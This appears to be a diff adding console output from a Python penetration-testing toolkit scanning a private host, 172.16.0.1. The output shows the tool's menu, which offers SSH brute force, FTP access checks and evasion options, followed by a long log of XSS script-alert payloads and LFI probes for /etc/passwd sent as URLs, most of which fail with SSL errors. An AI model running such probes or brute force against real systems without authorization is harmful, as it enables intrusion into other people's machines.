@@ -1,0 +1,524 @@
+
+ [*] IP/Hostname: 172.16.0.1 / 172.16.0.1
+[0]-->EXIT
+[1]-->Check Open Ports[80,8080 by default]
+[2]-->Port Scanning[It will scan over ports parameter,by default it will scan 80 and 8080]
+[3]-->Nmap Scanning Advanced
+[4]-->Check Option methods
+[5]-->Check DNS Servers info
+[6]-->Check Host info from Shodan Service
+[7]-->NMAP Port Scanning
+[8]-->Host Info by Socket Call
+[9]-->GeoLocation Host Info
+[10]-->Scraping for images and pdf & obtain metadata
+[11]-->Get Headers info
+[12]-->Get SSH user/password Brute Force[Requires port 22 opened]
+[13]-->Get FTP Anonymous access[Requires port 21 opened]
+[14]-->MetaSploitFrameWork
+[15]-->NexposeFramework
+[16]-->HTTP SCAN[Requires port 80 opened]
+[17]-->Check HeartBleed OpenSSL vulnerability[Requires port 443 opened]
+[18]-->Check FTP Server Buffer Overflow Vulnerability[Requires port 21 opened]
+[19]-->Check Vulnerabilities SQL,XSS,LFI in domain
+[20]-->Check Domains and obtain metadata[mails, hosts, servers,urls]
+[21]-->Check open ports with scapy
+[22]-->Check website libraries
+[23]-->Identify web server
+[24]-->Check headers & Clickjacking
+[25]-->Check Cookies from website
+Choose an option:Scanning Options
+[1] Intense Scan
+[2] Intense Scan + UDP
+[3] Intense Scan - all TCP ports
+[4] Intense Scan without ping
+[5] Ping Scan
+[6] Quickie Scan
+[7] Quick Traceroute
+[8] Normal Scan
+[9] Send Bad Checksums
+[10] Generate Randon Mac Adress Spoofing for Evasion
+[11] Fragment Packets
+Choose your Scanning Option:
+[**] Done 
+
+
+ [*] IP/Hostname: 172.16.0.1 / 172.16.0.1
+[0]-->EXIT
+[1]-->Check Open Ports[80,8080 by default]
+[2]-->Port Scanning[It will scan over ports parameter,by default it will scan 80 and 8080]
+[3]-->Nmap Scanning Advanced
+[4]-->Check Option methods
+[5]-->Check DNS Servers info
+[6]-->Check Host info from Shodan Service
+[7]-->NMAP Port Scanning
+[8]-->Host Info by Socket Call
+[9]-->GeoLocation Host Info
+[10]-->Scraping for images and pdf & obtain metadata
+[11]-->Get Headers info
+[12]-->Get SSH user/password Brute Force[Requires port 22 opened]
+[13]-->Get FTP Anonymous access[Requires port 21 opened]
+[14]-->MetaSploitFrameWork
+[15]-->NexposeFramework
+[16]-->HTTP SCAN[Requires port 80 opened]
+[17]-->Check HeartBleed OpenSSL vulnerability[Requires port 443 opened]
+[18]-->Check FTP Server Buffer Overflow Vulnerability[Requires port 21 opened]
+[19]-->Check Vulnerabilities SQL,XSS,LFI in domain
+[20]-->Check Domains and obtain metadata[mails, hosts, servers,urls]
+[21]-->Check open ports with scapy
+[22]-->Check website libraries
+[23]-->Identify web server
+[24]-->Check headers & Clickjacking
+[25]-->Check Cookies from website
+Choose an option:Cheking ports....
+['80', '8080']
+Port 80: 	 Open
+Scanning Completed in:  0:00:00.028646
+Checking Port 80.....: 
+172.16.0.1      -> Open Port                               
+172.16.0.1      -> Closed Port: (global name 'selenium' is not defined)
+
+ [*] IP/Hostname: 172.16.0.1 / 172.16.0.1
+[0]-->EXIT
+[1]-->Check Open Ports[80,8080 by default]
+[2]-->Port Scanning[It will scan over ports parameter,by default it will scan 80 and 8080]
+[3]-->Nmap Scanning Advanced
+[4]-->Check Option methods
+[5]-->Check DNS Servers info
+[6]-->Check Host info from Shodan Service
+[7]-->NMAP Port Scanning
+[8]-->Host Info by Socket Call
+[9]-->GeoLocation Host Info
+[10]-->Scraping for images and pdf & obtain metadata
+[11]-->Get Headers info
+[12]-->Get SSH user/password Brute Force[Requires port 22 opened]
+[13]-->Get FTP Anonymous access[Requires port 21 opened]
+[14]-->MetaSploitFrameWork
+[15]-->NexposeFramework
+[16]-->HTTP SCAN[Requires port 80 opened]
+[17]-->Check HeartBleed OpenSSL vulnerability[Requires port 443 opened]
+[18]-->Check FTP Server Buffer Overflow Vulnerability[Requires port 21 opened]
+[19]-->Check Vulnerabilities SQL,XSS,LFI in domain
+[20]-->Check Domains and obtain metadata[mails, hosts, servers,urls]
+[21]-->Check open ports with scapy
+[22]-->Check website libraries
+[23]-->Identify web server
+[24]-->Check headers & Clickjacking
+[25]-->Check Cookies from website
+Choose an option:
+ [*] IP/Hostname: 172.16.0.1 / 172.16.0.1
+[0]-->EXIT
+[2]-->Port Scanning[It will scan over ports parameter,by default it will scan 80 and 8080]
+[3]-->Nmap Scanning Advanced
+[7]-->NMAP Port Scanning
+[8]-->Host Info by Socket Call
+[12]-->Get SSH user/password Brute Force[Requires port 22 opened]
+[13]-->Get FTP Anonymous access[Requires port 21 opened]
+[14]-->MetaSploitFrameWork
+[15]-->NexposeFramework
+[17]-->Check HeartBleed OpenSSL vulnerability[Requires port 443 opened]
+[18]-->Check FTP Server Buffer Overflow Vulnerability[Requires port 21 opened]
+[19]-->Check Vulnerabilities SQL,XSS,LFI in domain
+[20]-->Check Domains and obtain metadata[mails, hosts, servers,urls]
+[21]-->Check open ports with scapy
+Choose an option:[+] Searching urls, emails and domains......
+http://172.16.0.1
+301  http_error_301  https://172.16.0.1/
+
+
+[+] Emails:
+------------------
+No emails found
+
+[+] Hosts:
+------------------------------------
+No hosts found
+
+[+] Shodan Database search:
+------------------------------------
+
+[+] Shodan results:
+------------------------------------
+
+ [*] IP/Hostname: 172.16.0.1 / 172.16.0.1
+[0]-->EXIT
+[2]-->Port Scanning[It will scan over ports parameter,by default it will scan 80 and 8080]
+[3]-->Nmap Scanning Advanced
+[7]-->NMAP Port Scanning
+[8]-->Host Info by Socket Call
+[12]-->Get SSH user/password Brute Force[Requires port 22 opened]
+[13]-->Get FTP Anonymous access[Requires port 21 opened]
+[14]-->MetaSploitFrameWork
+[15]-->NexposeFramework
+[17]-->Check HeartBleed OpenSSL vulnerability[Requires port 443 opened]
+[18]-->Check FTP Server Buffer Overflow Vulnerability[Requires port 21 opened]
+[19]-->Check Vulnerabilities SQL,XSS,LFI in domain
+[20]-->Check Domains and obtain metadata[mails, hosts, servers,urls]
+[21]-->Check open ports with scapy
+Choose an option:
+###### Started scanning for checkSQLVulnerability '172.16.0.1' ######
+
+
+###### Started scanning for checkSQLVulnerability '172.16.0.1' ######
+
+
+###### Started scanning for checkXSSVulnerability '172.16.0.1' ######
+
+http://172.16.0.1/%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
+###### Started scanning for checkXSSVulnerability '172.16.0.1' ######
+
+
+
+###### Started scanning for checkLFIVulnerability '172.16.0.1' ######
+http://172.16.0.1/%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
+
+http://172.16.0.1/=
+###### Started scanning for checkLFIVulnerability '172.16.0.1' ######
+
+
+http://172.16.0.1/=
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/<script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/' (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+[-] Not SQL Vulnerable
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/<script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/' (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+[-] Not SQL Vulnerable
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3Ch1%3EXSS%3C/h1%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3Ch1%3EXSS%3C/h1%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Ch1%3EXSS%3C/h1%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/<h1>XSS</h1>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Ch1%3EXSS%3C/h1%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/<h1>XSS</h1>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Ch1%3EXSS%3C/h1%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/"><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3Ch1%3EXSS%3C/h1%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/"><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/</script><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/</script><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/"/><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/script%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/"/><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%22/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%22/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/'/><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/'/><script>alert("XSS")</script>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/'/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/'/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/'/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/'/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/'/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/</SCRIPT>"><SCRIPT>alert("XSS")</SCRIPT>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/'/%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/</SCRIPT>"><SCRIPT>alert("XSS")</SCRIPT>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/</SCRIPT>">"><SCRIPT>alert("XSS")</SCRIPT>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd%00 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/</SCRIPT>">"><SCRIPT>alert("XSS")</SCRIPT>
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3C/SCRIPT%3E%22%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%3C/SCRIPT%3E%22%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/=../etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/";alert("XSS");"
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%3C/SCRIPT%3E%22%3E%22%3E%3CSCRIPT%3Ealert(%22XSS%22)%3C/SCRIPT%3E (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/";alert("XSS");"
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22);%22 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%22;alert(%22XSS%22);%22
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22);%22 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/%22;alert(%22XSS%22);%22
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22);%22 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/%22;alert(%22XSS%22);%22 (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+
+http://172.16.0.1/';alert("XSS");'
+http://172.16.0.1/';alert("XSS");'
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/etc/passwd (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22);' (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/';alert(%22XSS%22);'
+HTTPSConnectionPool(host='172.16.0.1', port=443): Max retries exceeded with url: /index.php/';alert(%22XSS%22);' (Caused by SSLError(SSLError(1, u'[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:727)'),))
+http://172.16.0.1/';alert(%22XSS%22);'
